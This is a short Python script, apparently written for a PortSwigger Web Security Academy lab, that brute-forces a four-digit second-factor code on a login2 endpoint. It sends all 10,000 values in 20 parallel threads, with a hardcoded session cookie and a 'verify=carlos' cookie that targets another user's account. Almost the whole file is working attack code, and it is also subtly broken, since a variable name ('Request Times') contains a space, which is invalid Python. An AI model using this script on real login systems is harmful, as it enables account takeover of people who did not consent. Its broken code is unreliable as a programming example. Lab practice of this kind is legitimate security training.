
#Author: MeowHecker 侯智晟
#purpose: Testing websit security 

import requests
import threading
import sys 


url = "https://0abb00900473ee8581fda7b000210004.web-security-academy.net/login2"

Headers = {
    "Host": "0abb00900473ee8581fda7b000210004.web-security-academy.net",
    "Cookie": "session=ZMa2DO1IVwmxTXziQudZArIN2hOTK96N; verify=carlos",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "13",
    "Origin": "https://0a9a007003b6a113810d20ef00100039.web-security-academy.net",
    "Referer": "https://0a9a007003b6a113810d20ef00100039.web-security-academy.net/login2",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Te": "trailers"
}

Request Times = 0

def sendRequest(payload,sem): 
    
    global Request Times 
    
    
    
    payloads = {
        "Payload": payload
    }
    # Send request and save Response 
    response = requests.post(url,headers = Headers,data=payloads)
    
    print(f'Request Times{Request Times}:stauts code:{response.status_code} payloads: {payload}')

    Request Times = Request Times + 1

     # Target / Success ? (Status code)
    if(response.status_code != 200): # Found !!!!!!!
        print(f"Payload: {payload}, Response: {response.text}")
        sys.exit()  
   
    
    sem.release()  # Release Singal  
    sys.exit() # Termerate Threading Process 


def threadingF():

    maxThreading = 20
    sem = threading.BoundedSemaphore(maxThreading)


    # str(i).zfill(4) 將每個數字轉換為 4 位數的字串 /0001,0002,0003
    for i in range(10000):
        
        # Custom Payload 
        payload = str(i).zfill(4)
        
        
        
        sem.acquire() # Signal Acquire (Start) "Singal = Unipue ID"
        sendRequestHandler = threading.Thread(target=sendRequest, args=(payload,sem))
        sendRequestHandler.start()
        print("Number of active threads:", threading.active_count())

    sys.exit()
  
    
threadingF()

sys.exit()